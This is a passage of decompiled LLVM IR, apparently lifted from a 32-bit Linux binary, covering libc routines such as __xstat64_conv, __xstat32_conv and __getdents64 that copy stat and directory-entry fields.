  %v0_8066282 = phi i32 [ %v7_8066266, %entry ], [ -1, %dec_label_pc_8066273 ]
  %v2_8066280 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8066280, i32* @esi, align 4
  store i32 %v0_8066248, i32* @edi, align 4
  ret i32 %v0_8066282

; uselistorder directives
  uselistorder i32 %v7_8066266, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @mremap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8066280, { 1, 0 }
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg1 to i32
  %tmp4 = inttoptr i32 %arg2 to i8*
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_806628d = load i32, i32* @ebx, align 4
  store i32 %v0_806628d, i32* %stack_var_-12, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  store i32 %tmp2, i32* %ebx.global-to-local, align 4
  %v5_806629b = call i8* @_memset(i8* %tmp4, i32 0, i32 24)
  %v2_806629d = load i32, i32* %arg1, align 4
  store i32 %v2_806629d, i32* %eax.global-to-local, align 4
  %v1_806629f = add i32 %tmp2, 4
  %v2_806629f = inttoptr i32 %v1_806629f to i32*
  %v3_806629f = load i32, i32* %v2_806629f, align 4
  store i32 %v3_806629f, i32* %edx.global-to-local, align 4
  %v1_80662a2 = load i32, i32* %esi.global-to-local, align 4
  %v2_80662a2 = inttoptr i32 %v1_80662a2 to i32*
  store i32 %v2_806629d, i32* %v2_80662a2, align 4
  %v0_80662a4 = load i32, i32* %edx.global-to-local, align 4
  %v1_80662a4 = load i32, i32* %esi.global-to-local, align 4
  %v2_80662a4 = add i32 %v1_80662a4, 4
  %v3_80662a4 = inttoptr i32 %v2_80662a4 to i32*
  store i32 %v0_80662a4, i32* %v3_80662a4, align 4
  %v0_80662a7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80662a7 = add i32 %v0_80662a7, 88
  %v2_80662a7 = inttoptr i32 %v1_80662a7 to i32*
  %v3_80662a7 = load i32, i32* %v2_80662a7, align 4
  store i32 %v3_80662a7, i32* %eax.global-to-local, align 4
  %v1_80662aa = add i32 %v0_80662a7, 92
  %v2_80662aa = inttoptr i32 %v1_80662aa to i32*
  %v3_80662aa = load i32, i32* %v2_80662aa, align 4
  store i32 %v3_80662aa, i32* %edx.global-to-local, align 4
  %v0_80662ad = load i32, i32* %esi.global-to-local, align 4
  %v1_80662ad = add i32 %v0_80662ad, 36
  %v2_80662ad = inttoptr i32 %v1_80662ad to i32*
  store i32 0, i32* %v2_80662ad, align 4
  %v0_80662b4 = load i32, i32* %eax.global-to-local, align 4
  %v1_80662b4 = load i32, i32* %esi.global-to-local, align 4
  %v2_80662b4 = add i32 %v1_80662b4, 88
  %v3_80662b4 = inttoptr i32 %v2_80662b4 to i32*
  store i32 %v0_80662b4, i32* %v3_80662b4, align 4
  %v0_80662b7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80662b7 = add i32 %v0_80662b7, 12
  %v2_80662b7 = inttoptr i32 %v1_80662b7 to i32*
  %v3_80662b7 = load i32, i32* %v2_80662b7, align 4
  store i32 %v3_80662b7, i32* %eax.global-to-local, align 4
  %v0_80662ba = load i32, i32* %edx.global-to-local, align 4
  %v1_80662ba = load i32, i32* %esi.global-to-local, align 4
  %v2_80662ba = add i32 %v1_80662ba, 92
  %v3_80662ba = inttoptr i32 %v2_80662ba to i32*
  store i32 %v0_80662ba, i32* %v3_80662ba, align 4
  %v0_80662bd = load i32, i32* %eax.global-to-local, align 4
  %v1_80662bd = load i32, i32* %esi.global-to-local, align 4
  %v2_80662bd = add i32 %v1_80662bd, 12
  %v3_80662bd = inttoptr i32 %v2_80662bd to i32*
  store i32 %v0_80662bd, i32* %v3_80662bd, align 4
  %v0_80662c0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80662c0 = add i32 %v0_80662c0, 16
  %v2_80662c0 = inttoptr i32 %v1_80662c0 to i32*
  %v3_80662c0 = load i32, i32* %v2_80662c0, align 4
  store i32 %v3_80662c0, i32* %eax.global-to-local, align 4
  %v1_80662c3 = load i32, i32* %esi.global-to-local, align 4
  %v2_80662c3 = add i32 %v1_80662c3, 16
  %v3_80662c3 = inttoptr i32 %v2_80662c3 to i32*
  store i32 %v3_80662c0, i32* %v3_80662c3, align 4
  %v0_80662c6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80662c6 = add i32 %v0_80662c6, 20
  %v2_80662c6 = inttoptr i32 %v1_80662c6 to i32*
  %v3_80662c6 = load i32, i32* %v2_80662c6, align 4
  store i32 %v3_80662c6, i32* %eax.global-to-local, align 4
  %v1_80662c9 = load i32, i32* %esi.global-to-local, align 4
  %v2_80662c9 = add i32 %v1_80662c9, 20
  %v3_80662c9 = inttoptr i32 %v2_80662c9 to i32*
  store i32 %v3_80662c6, i32* %v3_80662c9, align 4
  %v0_80662cc = load i32, i32* %ebx.global-to-local, align 4
  %v1_80662cc = add i32 %v0_80662cc, 24
  %v2_80662cc = inttoptr i32 %v1_80662cc to i32*
  %v3_80662cc = load i32, i32* %v2_80662cc, align 4
  store i32 %v3_80662cc, i32* %eax.global-to-local, align 4
  %v1_80662cf = load i32, i32* %esi.global-to-local, align 4
  %v2_80662cf = add i32 %v1_80662cf, 24
  %v3_80662cf = inttoptr i32 %v2_80662cf to i32*
  store i32 %v3_80662cc, i32* %v3_80662cf, align 4
  %v0_80662d2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80662d2 = add i32 %v0_80662d2, 28
  %v2_80662d2 = inttoptr i32 %v1_80662d2 to i32*
  %v3_80662d2 = load i32, i32* %v2_80662d2, align 4
  store i32 %v3_80662d2, i32* %eax.global-to-local, align 4
  %v1_80662d5 = load i32, i32* %esi.global-to-local, align 4
  %v2_80662d5 = add i32 %v1_80662d5, 28
  %v3_80662d5 = inttoptr i32 %v2_80662d5 to i32*
  store i32 %v3_80662d2, i32* %v3_80662d5, align 4
  %v0_80662d8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80662d8 = add i32 %v0_80662d8, 32
  %v2_80662d8 = inttoptr i32 %v1_80662d8 to i16*
  %v3_80662d8 = load i16, i16* %v2_80662d8, align 2
  %v4_80662d8 = zext i16 %v3_80662d8 to i32
  store i32 %v4_80662d8, i32* %eax.global-to-local, align 4
  %v1_80662dc = load i32, i32* %esi.global-to-local, align 4
  %v2_80662dc = add i32 %v1_80662dc, 32
  %v3_80662dc = inttoptr i32 %v2_80662dc to i32*
  store i32 %v4_80662d8, i32* %v3_80662dc, align 4
  %v0_80662df = load i32, i32* %ebx.global-to-local, align 4
  %v1_80662df = add i32 %v0_80662df, 44
  %v2_80662df = inttoptr i32 %v1_80662df to i32*
  %v3_80662df = load i32, i32* %v2_80662df, align 4
  store i32 %v3_80662df, i32* %eax.global-to-local, align 4
  %v1_80662e2 = add i32 %v0_80662df, 48
  %v2_80662e2 = inttoptr i32 %v1_80662e2 to i32*
  %v3_80662e2 = load i32, i32* %v2_80662e2, align 4
  store i32 %v3_80662e2, i32* %edx.global-to-local, align 4
  %v0_80662e5 = load i32, i32* %esi.global-to-local, align 4
  %v1_80662e5 = add i32 %v0_80662e5, 60
  %v2_80662e5 = inttoptr i32 %v1_80662e5 to i32*
  store i32 0, i32* %v2_80662e5, align 4
  %v0_80662ec = load i32, i32* %eax.global-to-local, align 4
  %v1_80662ec = load i32, i32* %esi.global-to-local, align 4
  %v2_80662ec = add i32 %v1_80662ec, 44
  %v3_80662ec = inttoptr i32 %v2_80662ec to i32*
  store i32 %v0_80662ec, i32* %v3_80662ec, align 4
  %v0_80662ef = load i32, i32* %ebx.global-to-local, align 4
  %v1_80662ef = add i32 %v0_80662ef, 52
  %v2_80662ef = inttoptr i32 %v1_80662ef to i32*
  %v3_80662ef = load i32, i32* %v2_80662ef, align 4
  store i32 %v3_80662ef, i32* %eax.global-to-local, align 4
  %v0_80662f2 = load i32, i32* %edx.global-to-local, align 4
  %v1_80662f2 = load i32, i32* %esi.global-to-local, align 4
  %v2_80662f2 = add i32 %v1_80662f2, 48
  %v3_80662f2 = inttoptr i32 %v2_80662f2 to i32*
  store i32 %v0_80662f2, i32* %v3_80662f2, align 4
  %v0_80662f5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80662f5 = load i32, i32* %esi.global-to-local, align 4
  %v2_80662f5 = add i32 %v1_80662f5, 52
  %v3_80662f5 = inttoptr i32 %v2_80662f5 to i32*
  store i32 %v0_80662f5, i32* %v3_80662f5, align 4
  %v0_80662f8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80662f8 = add i32 %v0_80662f8, 56
  %v2_80662f8 = inttoptr i32 %v1_80662f8 to i32*
  %v3_80662f8 = load i32, i32* %v2_80662f8, align 4
  store i32 %v3_80662f8, i32* %eax.global-to-local, align 4
  %v1_80662fb = add i32 %v0_80662f8, 64
  %v2_80662fb = inttoptr i32 %v1_80662fb to i32*
  %v3_80662fb = load i32, i32* %v2_80662fb, align 4
  store i32 %v3_80662fb, i32* %edx.global-to-local, align 4
  %v1_80662fe = load i32, i32* %esi.global-to-local, align 4
  %v2_80662fe = add i32 %v1_80662fe, 56
  %v3_80662fe = inttoptr i32 %v2_80662fe to i32*
  store i32 %v3_80662f8, i32* %v3_80662fe, align 4
  %v0_8066301 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8066301 = add i32 %v0_8066301, 68
  %v2_8066301 = inttoptr i32 %v1_8066301 to i32*
  %v3_8066301 = load i32, i32* %v2_8066301, align 4
  store i32 %v3_8066301, i32* %eax.global-to-local, align 4
  %v1_8066304 = load i32, i32* %esi.global-to-local, align 4
  %v2_8066304 = add i32 %v1_8066304, 68
  %v3_8066304 = inttoptr i32 %v2_8066304 to i32*
  store i32 %v3_8066301, i32* %v3_8066304, align 4
  %v0_8066307 = load i32, i32* %edx.global-to-local, align 4
  %v1_8066307 = load i32, i32* %esi.global-to-local, align 4
  %v2_8066307 = add i32 %v1_8066307, 64
  %v3_8066307 = inttoptr i32 %v2_8066307 to i32*
  store i32 %v0_8066307, i32* %v3_8066307, align 4
  %v0_806630a = load i32, i32* %ebx.global-to-local, align 4
  %v1_806630a = add i32 %v0_806630a, 72
  %v2_806630a = inttoptr i32 %v1_806630a to i32*
  %v3_806630a = load i32, i32* %v2_806630a, align 4
  store i32 %v3_806630a, i32* %edx.global-to-local, align 4
  %v1_806630d = add i32 %v0_806630a, 76
  %v2_806630d = inttoptr i32 %v1_806630d to i32*
  %v3_806630d = load i32, i32* %v2_806630d, align 4
  store i32 %v3_806630d, i32* %eax.global-to-local, align 4
  %v1_8066310 = load i32, i32* %esi.global-to-local, align 4
  %v2_8066310 = add i32 %v1_8066310, 72
  %v3_8066310 = inttoptr i32 %v2_8066310 to i32*
  store i32 %v3_806630a, i32* %v3_8066310, align 4
  %v0_8066313 = load i32, i32* %eax.global-to-local, align 4
  %v1_8066313 = load i32, i32* %esi.global-to-local, align 4
  %v2_8066313 = add i32 %v1_8066313, 76
  %v3_8066313 = inttoptr i32 %v2_8066313 to i32*
  store i32 %v0_8066313, i32* %v3_8066313, align 4
  %v0_8066316 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8066316 = add i32 %v0_8066316, 80
  %v2_8066316 = inttoptr i32 %v1_8066316 to i32*
  %v3_8066316 = load i32, i32* %v2_8066316, align 4
  store i32 %v3_8066316, i32* %edx.global-to-local, align 4
  %v1_8066319 = add i32 %v0_8066316, 84
  %v2_8066319 = inttoptr i32 %v1_8066319 to i32*
  %v3_8066319 = load i32, i32* %v2_8066319, align 4
  store i32 %v3_8066319, i32* %eax.global-to-local, align 4
  %v1_806631c = load i32, i32* %esi.global-to-local, align 4
  %v2_806631c = add i32 %v1_806631c, 80
  %v3_806631c = inttoptr i32 %v2_806631c to i32*
  store i32 %v3_8066316, i32* %v3_806631c, align 4
  %v0_806631f = load i32, i32* %eax.global-to-local, align 4
  %v1_806631f = load i32, i32* %esi.global-to-local, align 4
  %v2_806631f = add i32 %v1_806631f, 84
  %v3_806631f = inttoptr i32 %v2_806631f to i32*
  store i32 %v0_806631f, i32* %v3_806631f, align 4
  %v2_8066322 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8066322, i32* %eax.global-to-local, align 4
  %v2_8066323 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8066323, i32* %ebx.global-to-local, align 4
  ret i32 %v2_8066322

; uselistorder directives
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 13, 8, 9, 10, 11, 12, 14 }
  uselistorder i32 92, { 3, 4, 2, 1, 0 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg1 to i32
  %tmp4 = inttoptr i32 %arg2 to i8*
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8066330 = load i32, i32* @ebx, align 4
  store i32 %v0_8066330, i32* %stack_var_-12, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  store i32 %tmp2, i32* %ebx.global-to-local, align 4
  %v5_806633e = call i8* @_memset(i8* %tmp4, i32 0, i32 22)
  %v6_806633e = ptrtoint i8* %v5_806633e to i32
  store i32 %v6_806633e, i32* @ecx, align 4
  %v2_8066340 = load i32, i32* %arg1, align 4
  store i32 %v2_8066340, i32* %eax.global-to-local, align 4
  %v1_8066342 = add i32 %tmp2, 4
  %v2_8066342 = inttoptr i32 %v1_8066342 to i32*
  %v3_8066342 = load i32, i32* %v2_8066342, align 4
  store i32 %v3_8066342, i32* %edx.global-to-local, align 4
  %v1_8066345 = load i32, i32* %esi.global-to-local, align 4
  %v2_8066345 = inttoptr i32 %v1_8066345 to i32*
  store i32 %v2_8066340, i32* %v2_8066345, align 4
  %v0_8066347 = load i32, i32* %edx.global-to-local, align 4
  %v1_8066347 = load i32, i32* %esi.global-to-local, align 4
  %v2_8066347 = add i32 %v1_8066347, 4
  %v3_8066347 = inttoptr i32 %v2_8066347 to i32*
  store i32 %v0_8066347, i32* %v3_8066347, align 4
  %v0_806634a = load i32, i32* %ebx.global-to-local, align 4
  %v1_806634a = add i32 %v0_806634a, 88
  %v2_806634a = inttoptr i32 %v1_806634a to i32*
  %v3_806634a = load i32, i32* %v2_806634a, align 4
  store i32 %v3_806634a, i32* %eax.global-to-local, align 4
  %v0_806634d = load i32, i32* %esi.global-to-local, align 4
  %v1_806634d = add i32 %v0_806634d, 36
  %v2_806634d = inttoptr i32 %v1_806634d to i32*
  store i32 0, i32* %v2_806634d, align 4
  %v0_8066354 = load i32, i32* %eax.global-to-local, align 4
  %v1_8066354 = load i32, i32* %esi.global-to-local, align 4
  %v2_8066354 = add i32 %v1_8066354, 12
  %v3_8066354 = inttoptr i32 %v2_8066354 to i32*
  store i32 %v0_8066354, i32* %v3_8066354, align 4
  %v0_8066357 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8066357 = add i32 %v0_8066357, 16
  %v2_8066357 = inttoptr i32 %v1_8066357 to i32*
  %v3_8066357 = load i32, i32* %v2_8066357, align 4
  store i32 %v3_8066357, i32* %eax.global-to-local, align 4
  %v1_806635a = load i32, i32* %esi.global-to-local, align 4
  %v2_806635a = add i32 %v1_806635a, 16
  %v3_806635a = inttoptr i32 %v2_806635a to i32*
  store i32 %v3_8066357, i32* %v3_806635a, align 4
  %v0_806635d = load i32, i32* %ebx.global-to-local, align 4
  %v1_806635d = add i32 %v0_806635d, 20
  %v2_806635d = inttoptr i32 %v1_806635d to i32*
  %v3_806635d = load i32, i32* %v2_806635d, align 4
  store i32 %v3_806635d, i32* %eax.global-to-local, align 4
  %v1_8066360 = load i32, i32* %esi.global-to-local, align 4
  %v2_8066360 = add i32 %v1_8066360, 20
  %v3_8066360 = inttoptr i32 %v2_8066360 to i32*
  store i32 %v3_806635d, i32* %v3_8066360, align 4
  %v0_8066363 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8066363 = add i32 %v0_8066363, 24
  %v2_8066363 = inttoptr i32 %v1_8066363 to i32*
  %v3_8066363 = load i32, i32* %v2_8066363, align 4
  store i32 %v3_8066363, i32* %eax.global-to-local, align 4
  %v1_8066366 = load i32, i32* %esi.global-to-local, align 4
  %v2_8066366 = add i32 %v1_8066366, 24
  %v3_8066366 = inttoptr i32 %v2_8066366 to i32*
  store i32 %v3_8066363, i32* %v3_8066366, align 4
  %v0_8066369 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8066369 = add i32 %v0_8066369, 28
  %v2_8066369 = inttoptr i32 %v1_8066369 to i32*
  %v3_8066369 = load i32, i32* %v2_8066369, align 4
  store i32 %v3_8066369, i32* %eax.global-to-local, align 4
  %v1_806636c = load i32, i32* %esi.global-to-local, align 4
  %v2_806636c = add i32 %v1_806636c, 28
  %v3_806636c = inttoptr i32 %v2_806636c to i32*
  store i32 %v3_8066369, i32* %v3_806636c, align 4
  %v0_806636f = load i32, i32* %ebx.global-to-local, align 4
  %v1_806636f = add i32 %v0_806636f, 32
  %v2_806636f = inttoptr i32 %v1_806636f to i16*
  %v3_806636f = load i16, i16* %v2_806636f, align 2
  %v4_806636f = zext i16 %v3_806636f to i32
  store i32 %v4_806636f, i32* %eax.global-to-local, align 4
  %v1_8066373 = load i32, i32* %esi.global-to-local, align 4
  %v2_8066373 = add i32 %v1_8066373, 32
  %v3_8066373 = inttoptr i32 %v2_8066373 to i32*
  store i32 %v4_806636f, i32* %v3_8066373, align 4
  %v0_8066376 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8066376 = add i32 %v0_8066376, 44
  %v2_8066376 = inttoptr i32 %v1_8066376 to i32*
  %v3_8066376 = load i32, i32* %v2_8066376, align 4
  store i32 %v3_8066376, i32* %eax.global-to-local, align 4
  %v1_8066379 = load i32, i32* %esi.global-to-local, align 4
  %v2_8066379 = add i32 %v1_8066379, 44
  %v3_8066379 = inttoptr i32 %v2_8066379 to i32*
  store i32 %v3_8066376, i32* %v3_8066379, align 4
  %v0_806637c = load i32, i32* %ebx.global-to-local, align 4
  %v1_806637c = add i32 %v0_806637c, 52
  %v2_806637c = inttoptr i32 %v1_806637c to i32*
  %v3_806637c = load i32, i32* %v2_806637c, align 4
  store i32 %v3_806637c, i32* %eax.global-to-local, align 4
  %v1_806637f = load i32, i32* %esi.global-to-local, align 4
  %v2_806637f = add i32 %v1_806637f, 48
  %v3_806637f = inttoptr i32 %v2_806637f to i32*
  store i32 %v3_806637c, i32* %v3_806637f, align 4
  %v0_8066382 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8066382 = add i32 %v0_8066382, 56
  %v2_8066382 = inttoptr i32 %v1_8066382 to i32*
  %v3_8066382 = load i32, i32* %v2_8066382, align 4
  store i32 %v3_8066382, i32* %eax.global-to-local, align 4
  %v1_8066385 = load i32, i32* %esi.global-to-local, align 4
  %v2_8066385 = add i32 %v1_8066385, 52
  %v3_8066385 = inttoptr i32 %v2_8066385 to i32*
  store i32 %v3_8066382, i32* %v3_8066385, align 4
  %v0_8066388 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8066388 = add i32 %v0_8066388, 64
  %v2_8066388 = inttoptr i32 %v1_8066388 to i32*
  %v3_8066388 = load i32, i32* %v2_8066388, align 4
  store i32 %v3_8066388, i32* %edx.global-to-local, align 4
  %v1_806638b = add i32 %v0_8066388, 68
  %v2_806638b = inttoptr i32 %v1_806638b to i32*
  %v3_806638b = load i32, i32* %v2_806638b, align 4
  store i32 %v3_806638b, i32* %eax.global-to-local, align 4
  %v1_806638e = load i32, i32* %esi.global-to-local, align 4
  %v2_806638e = add i32 %v1_806638e, 56
  %v3_806638e = inttoptr i32 %v2_806638e to i32*
  store i32 %v3_8066388, i32* %v3_806638e, align 4
  %v0_8066391 = load i32, i32* %eax.global-to-local, align 4
  %v1_8066391 = load i32, i32* %esi.global-to-local, align 4
  %v2_8066391 = add i32 %v1_8066391, 60
  %v3_8066391 = inttoptr i32 %v2_8066391 to i32*
  store i32 %v0_8066391, i32* %v3_8066391, align 4
  %v0_8066394 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8066394 = add i32 %v0_8066394, 72
  %v2_8066394 = inttoptr i32 %v1_8066394 to i32*
  %v3_8066394 = load i32, i32* %v2_8066394, align 4
  store i32 %v3_8066394, i32* %edx.global-to-local, align 4
  %v1_8066397 = add i32 %v0_8066394, 76
  %v2_8066397 = inttoptr i32 %v1_8066397 to i32*
  %v3_8066397 = load i32, i32* %v2_8066397, align 4
  store i32 %v3_8066397, i32* %eax.global-to-local, align 4
  %v1_806639a = load i32, i32* %esi.global-to-local, align 4
  %v2_806639a = add i32 %v1_806639a, 64
  %v3_806639a = inttoptr i32 %v2_806639a to i32*
  store i32 %v3_8066394, i32* %v3_806639a, align 4
  %v0_806639d = load i32, i32* %eax.global-to-local, align 4
  %v1_806639d = load i32, i32* %esi.global-to-local, align 4
  %v2_806639d = add i32 %v1_806639d, 68
  %v3_806639d = inttoptr i32 %v2_806639d to i32*
  store i32 %v0_806639d, i32* %v3_806639d, align 4
  %v0_80663a0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80663a0 = add i32 %v0_80663a0, 80
  %v2_80663a0 = inttoptr i32 %v1_80663a0 to i32*
  %v3_80663a0 = load i32, i32* %v2_80663a0, align 4
  store i32 %v3_80663a0, i32* %edx.global-to-local, align 4
  %v1_80663a3 = add i32 %v0_80663a0, 84
  %v2_80663a3 = inttoptr i32 %v1_80663a3 to i32*
  %v3_80663a3 = load i32, i32* %v2_80663a3, align 4
  store i32 %v3_80663a3, i32* %eax.global-to-local, align 4
  %v1_80663a6 = load i32, i32* %esi.global-to-local, align 4
  %v2_80663a6 = add i32 %v1_80663a6, 76
  %v3_80663a6 = inttoptr i32 %v2_80663a6 to i32*
  store i32 %v3_80663a3, i32* %v3_80663a6, align 4
  %v0_80663a9 = load i32, i32* %edx.global-to-local, align 4
  %v1_80663a9 = load i32, i32* %esi.global-to-local, align 4
  %v2_80663a9 = add i32 %v1_80663a9, 72
  %v3_80663a9 = inttoptr i32 %v2_80663a9 to i32*
  store i32 %v0_80663a9, i32* %v3_80663a9, align 4
  %v2_80663ac = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80663ac, i32* %edx.global-to-local, align 4
  %v2_80663ad = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80663ad, i32* @ebx, align 4
  ret i32 %v3_80663a3

; uselistorder directives
  uselistorder i32 80, { 5, 3, 4, 2, 6, 7, 8, 1, 0 }
  uselistorder i32 88, { 4, 2, 3, 1, 0 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp15 = ptrtoint i32* %arg2 to i32
  %stack_var_-60 = alloca i32, align 4
  %v0_80663b7 = load i32, i32* @edi, align 4
  %v0_80663b8 = load i32, i32* @esi, align 4
  %v0_80663b9 = load i32, i32* @ebx, align 4
  %v15_80663ba = ptrtoint i32* %stack_var_-60 to i32
  store i32 %arg3, i32* %edi.global-to-local, align 4
  %v1_80663c0 = add i32 %arg3, 30
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v1_80663c5 = and i32 %v1_80663c0, -16
  %v2_80663c8 = sub i32 %v15_80663ba, %v1_80663c5
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_80663cd = add i32 %v2_80663c8, 15
  %v1_80663d1 = and i32 %v1_80663cd, -16
  %v8_80663d1 = inttoptr i32 %v1_80663d1 to %linux_dirent64*
  store i32 %v1_80663d1, i32* @ecx, align 4
  %v2_80663d4 = add i32 %v2_80663c8, -4
  %v3_80663d4 = inttoptr i32 %v2_80663d4 to i32*
  store i32 %v0_80663b9, i32* %v3_80663d4, align 4
  %v0_80663d5 = load i32, i32* %eax.global-to-local, align 4
  store i32 220, i32* %eax.global-to-local, align 4
  %v5_80663dc = call i32 @getdents64(i32 %v0_80663d5, %linux_dirent64* %v8_80663d1, i32 %arg3)
  store i32 %v5_80663dc, i32* %eax.global-to-local, align 4
  %v0_80663de = load i32, i32* @esp, align 4
  %v3_80663de = add i32 %v0_80663de, 4
  %tmp = icmp ult i32 %v5_80663dc, -4095
  br i1 %tmp, label %dec_label_pc_80663fb, label %dec_label_pc_80663e9

dec_label_pc_80663e9:                             ; preds = %entry
  %v1_80663e9 = sub i32 0, %v5_80663dc
  store i32 -8, i32* %eax.global-to-local, align 4
  store i32 %v1_80663e9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8066468

dec_label_pc_80663fb:                             ; preds = %entry
  store i32 -1, i32* %eax.global-to-local, align 4
  br i1 false, label %dec_label_pc_80664c5, label %dec_label_pc_8066408

dec_label_pc_8066408:                             ; preds = %dec_label_pc_80663fb
  store i32 %tmp15, i32* @esi, align 4
  store i32 %v1_80663d1, i32* @ebx, align 4
  %v0_806641e = load i32, i32* %edi.global-to-local, align 4
  %v2_806641e = add i32 %v0_806641e, %tmp15
  store i32 %v2_806641e, i32* %edi.global-to-local, align 4
  %v3_8066420 = add i32 %v5_80663dc, %v1_80663d1
  store i32 %v3_8066420, i32* %eax.global-to-local, align 4
  %v10_80664b731 = icmp ult i32 %v1_80663d1, %v3_8066420
  br i1 %v10_80664b731, label %dec_label_pc_806642d, label %dec_label_pc_80664c0

dec_label_pc_806642d:                             ; preds = %dec_label_pc_8066408, %dec_label_pc_806646d
  %stack_var_-28.042 = phi i32 [ %v0_8066477, %dec_label_pc_806646d ], [ -1, %dec_label_pc_8066408 ]
  %stack_var_-24.041 = phi i32 [ %v0_806647c, %dec_label_pc_806646d ], [ -1, %dec_label_pc_8066408 ]
  %v0_806646d40 = phi i32 [ %v2_80664b5, %dec_label_pc_806646d ], [ %v1_80663d1, %dec_label_pc_8066408 ]
  %v2_806647339 = phi i32 [ %v2_806643a, %dec_label_pc_806646d ], [ %tmp15, %dec_label_pc_8066408 ]
  %v0_806644438 = phi i32 [ %v1_80664af, %dec_label_pc_806646d ], [ %v3_80663de, %dec_label_pc_8066408 ]
  %v1_806642d = add i32 %v0_806646d40, 16
  %v2_806642d = inttoptr i32 %v1_806642d to i16*
  %v3_806642d = load i16, i16* %v2_806642d, align 2
  %v4_806642d = zext i16 %v3_806642d to i32
  store i32 %v4_806642d, i32* @edi, align 4
  store i32 %v2_806641e, i32* %eax.global-to-local, align 4
  %v1_8066434 = add nuw nsw i32 %v4_806642d, 3
  %v1_8066437 = and i32 %v1_8066434, 131068
  %v2_806643a = add i32 %v1_8066437, %v2_806647339
  store i32 %v2_806643a, i32* %edx.global-to-local, align 4
  %tmp47 = icmp ugt i32 %v2_806643a, %v2_806641e
  br i1 %tmp47, label %dec_label_pc_8066444, label %dec_label_pc_806646d

dec_label_pc_8066444:                             ; preds = %dec_label_pc_806642d
  %v1_8066444 = add i32 %v0_806644438, -4
  %v2_8066444 = inttoptr i32 %v1_8066444 to i32*
  store i32 0, i32* %v2_8066444, align 4
  %v5_8066446 = add i32 %v0_806644438, -8
  %v6_8066446 = inttoptr i32 %v5_8066446 to i32*
  store i32 %stack_var_-24.041, i32* %v6_8066446, align 4
  %v5_8066449 = add i32 %v0_806644438, -12
  %v6_8066449 = inttoptr i32 %v5_8066449 to i32*
  store i32 %stack_var_-28.042, i32* %v6_8066449, align 4
  %v5_806644c = add i32 %v0_806644438, -16
  %v6_806644c = inttoptr i32 %v5_806644c to i32*
  store i32 %arg1, i32* %v6_806644c, align 4
  %v1_806644f = call i32 @__GI_lseek64(i32 %v2_806643a)
  store i32 %v1_806644f, i32* %eax.global-to-local, align 4
  %v0_8066457 = load i32, i32* @esi, align 4
  %v15_8066457 = icmp eq i32 %v0_8066457, %tmp15
  %v1_806645a = icmp eq i1 %v15_8066457, false
  br i1 %v1_806645a, label %dec_label_pc_80664c0, label %dec_label_pc_806645c

dec_label_pc_806645c:                             ; preds = %dec_label_pc_8066444
  store i32 -8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8066468

dec_label_pc_8066468:                             ; preds = %dec_label_pc_80663e9, %dec_label_pc_806645c
  %storemerge = phi i32 [ 22, %dec_label_pc_806645c ], [ %v1_80663e9, %dec_label_pc_80663e9 ]
  store i32 %storemerge, i32* inttoptr (i32 -8 to i32*), align 8
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80664c5

dec_label_pc_806646d:                             ; preds = %dec_label_pc_806642d
  %v1_806646d = add i32 %v0_806646d40, 8
  %v2_806646d = inttoptr i32 %v1_806646d to i32*
  %v3_806646d = load i32, i32* %v2_806646d, align 4
  store i32 %v3_806646d, i32* %eax.global-to-local, align 4
  %v1_8066470 = add i32 %v0_806646d40, 12
  %v2_8066470 = inttoptr i32 %v1_8066470 to i32*
  %v3_8066470 = load i32, i32* %v2_8066470, align 4
  store i32 %v3_8066470, i32* %edx.global-to-local, align 4
  %v1_8066473 = trunc i32 %v1_8066437 to i16
  %v3_8066473 = add i32 %v2_806647339, 16
  %v4_8066473 = inttoptr i32 %v3_8066473 to i16*
